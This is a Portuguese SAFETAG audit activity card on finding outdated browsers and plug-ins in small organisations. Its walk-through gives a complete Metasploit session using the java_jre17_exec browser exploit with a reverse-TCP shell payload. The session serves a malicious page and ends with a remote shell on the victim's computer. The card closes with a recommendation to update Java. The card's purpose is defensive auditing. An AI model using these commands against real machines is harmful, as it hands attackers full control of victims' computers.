---
title: Verifique as vulnerabilidades do navegador e dos plug-ins
position: 50
approaches:
  - Técnico
authors:
  - SAFETAG
skills_trained: []
remote_options:
  - with-support
time_required_minutes: 30
organization_size_under: 25
summary: |
  Embora os navegadores modernos sejam melhores em se atualizar automaticamente e a prevalência de plug-ins poderosos, como flash e java, esteja diminuindo aos poucos, é importante garantir que os navegadores em uso tenham plug-ins atualizados e que eles próprios estejam atualizados.
short_summary: Certifique-se de que os navegadores em uso tenham plug-ins atualizados e que eles próprios estejam atualizados.
materials_needed: |
  * Metasploit
walk_through: |
  ###### Plug-ins Java desatualizados do navegadorEmbora a ameaça descrita abaixo seja mais grave se realizada por um invasor local (já que ele pode direcionar mais facilmente a vítima para um site malicioso), ela também funciona remotamente. Na verdade, se um usuário puder ser enganado por um invasor remoto para clicar em um e-mail ou link da Web malicioso, ataques como esse representam uma ameaça significativa ao perímetro. Ao comprometer a máquina da vítima, eles podem dar ao invasor um ponto de presença local sem exigir que ele quebre as chaves WPA ou obtenha acesso local de alguma outra forma.Etapa 1: usando o Metasploit, um invasor pode criar facilmente um site malicioso ad hoc:```$ msfconsoleEu adoro shells --egypt=[ metasploit v4.7.0-dev [core:4.7 api:1.0]+ -- --=[ 1114 exploits - 627 auxiliares - 178 pós+ -- --=[ 307 payloads - 30 encoders - 8 nopsmsf > use exploit/multi/browser/java_jre17_execmsf exploit(java_jre17_exec) > set PAYLOAD java/shell/reverse_tcpPAYLOAD => java/shell/reverse_tcpmsf exploit(java_jre17_exec) > set LHOST 192.168.1.123LHOST => 192.168.1.123msf exploit(java_jre17_exec) > set SRVPORT 8081SRVPORT => 8081msf exploit(java_jre17_exec) > definir URIPATH java_testURIPATH => java_testmsf exploit(java_jre17_exec) > executar[*] Exploit rodando como tarefa em segundo plano.```Passo 2: Nesse ponto, qualquer usuário local que visitar http://192.168.1.123:8081/java_test e estiver usando uma versão bastante desatualizada do plug-in Java do navegador tem uma boa chance de dar ao invasor acesso total ao seu computador:```[*] Iniciado o manipulador reverso em 192.168.1.123:4444msf exploit(java_jre17_exec) |[*] Usando URL: http://0.0.0.0:8081/java_test[*] IP local: http://192.168.1.123:8081/java_test[*] Servidor iniciado.msf exploit(java_jre17_exec) |<shell remoto|```Figura 1: Invasor controlando o computador da vítima por meio de um shell de comando remoto
considerations: ""
skills_required: []
overview: Use acesso direto, entrevistas, visitas guiadas ou métodos de teste de penetração para identificar navegadores vulneráveis.
recommendations: |
  **Exemplo de recomendação para Java desatualizado**Um ou mais laptops da organização foram vistos rodando uma versão desatualizada e vulnerável do plugin Java para o Internet Explorer.Essa versão contém uma vulnerabilidade que pode ser facilmente explorada usando um dos módulos de exploração Java recentes da estrutura de auditoria de segurança Metasploit, amplamente disponível. Esses módulos permitem que um invasor obtenha controle total sobre o computador de uma vítima que visita um site malicioso hospedado em qualquer lugar da Internet. Se o invasor estiver dentro da LAN do escritório, ele pode facilmente induzir a vítima a visitar esse site malicioso sem que ela perceba.Pelo menos um dos computadores da organização está executando um plug-in Java desatualizado, e o código de exploração está amplamente disponível para várias vulnerabilidades críticas em versões anteriores ao “Java 7, atualização 16”. Todas as instalações Java da organização devem ser atualizadas para a versão mais recente.Isso pode ser problemático, pois (ao contrário do próprio sistema operacional Windows) os plug-ins Java às vezes exigem a intervenção do usuário antes de instalar as atualizações.
---
